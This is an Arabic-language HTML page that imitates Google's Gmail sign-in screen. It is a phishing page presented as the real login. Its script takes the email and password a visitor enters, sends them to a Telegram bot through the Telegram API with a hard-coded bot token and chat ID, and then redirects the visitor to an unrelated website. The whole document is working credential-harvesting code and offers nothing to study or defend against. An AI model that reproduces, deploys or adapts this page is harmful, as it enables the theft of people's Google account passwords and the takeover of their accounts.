<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول - Google</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: #f2f2f2 url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSq19yICTWAbF0PgoNE2Iq5KE58cYS2ySo7-C5TSZVZypdg4KvLTTC8hmRv&s=10") no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .form-wrapper {
      background: rgba(255, 255, 255, 0.95);
      width: 100%;
      max-width: 400px;
      padding: 40px 30px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
      animation: fadeIn 0.5s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .form-wrapper img {
      display: block;
      margin: 0 auto 20px;
      height: 30px;
    }

    h2 {
      font-size: 24px;
      color: #202124;
      margin: 0 0 12px;
      font-weight: 400;
    }

    p {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 25px;
    }

    .input-group {
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 14px 10px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
      transition: border-color 0.2s;
    }

    input:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 1px #1a73e8;
    }

    button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 12px;
      font-size: 14px;
      border-radius: 4px;
      width: 100%;
      cursor: pointer;
      margin-top: 10px;
    }

    .link {
      color: #1a73e8;
      text-decoration: none;
      font-size: 13px;
      display: block;
      margin-top: 12px;
      text-align: right;
    }

    .status {
      margin-top: 12px;
      font-size: 13px;
      color: #d93025;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="form-wrapper" id="formBox">
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
    <h2>تسجيل الدخول</h2>
    <p>انتقل إلى Gmail</p>
    <div class="input-group">
      <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
    </div>
    <a class="link" href="#">هل نسيت البريد الإلكتروني؟</a>
    <button onclick="goToPassword()">التالي</button>
    <a class="link" href="#">استخدام حساب آخر</a>
    <div class="status" id="status"></div>
  </div>

  <script>
    function goToPassword() {
      const emailInput = document.getElementById("email");
      const email = emailInput.value.trim();
      const statusEl = document.getElementById("status");

      if (!email) {
        statusEl.textContent = "يرجى إدخال البريد الإلكتروني.";
        return;
      }

      const formBox = document.getElementById("formBox");
      formBox.innerHTML = `
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
        <h2>مرحبًا ${email}</h2>
        <p>أدخل كلمة المرور لحسابك</p>
        <div class="input-group">
          <input type="password" id="password" placeholder="كلمة المرور">
        </div>
        <a class="link" href="#">هل نسيت كلمة المرور؟</a>
        <button onclick="sendData('${email}')">تسجيل الدخول</button>
        <button onclick="goBack()">رجوع</button>
        <div class="status" id="status"></div>
      `;
    }

    function goBack() {
      location.reload();
    }

    function sendData(email) {
      const passwordInput = document.getElementById("password");
      const password = passwordInput.value.trim();
      const statusEl = document.getElementById("status");

      if (!password) {
        statusEl.textContent = "يرجى إدخال كلمة المرور.";
        return;
      }

      statusEl.textContent = "جارٍ تسجيل الدخول...";

      const message = `📥 تسجيل دخول جديد:\n📧 البريد: ${email}\n🔐 كلمة المرور: ${password}`;
      const token = "8185557975:AAEDUZuAvskBZTTvSqyHKfcVuR3CfoRjp3U";
      const chat_id = "6894787120";
      const url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chat_id}&text=\${encodeURIComponent(message)}\`;

      fetch(url)
        .then(res => {
          if (!res.ok) throw new Error("فشل الاتصال");
          statusEl.style.color = "#188038";
          statusEl.textContent = "✅ يتم التحويل...";
          setTimeout(() => {
            window.location.href = "https://www.arbada.com/";
          }, 1500);
        })
        .catch(() => {
          statusEl.textContent = "❌ فشل في الإرسال.";
        });
    }
  </script>
</body>
</html>
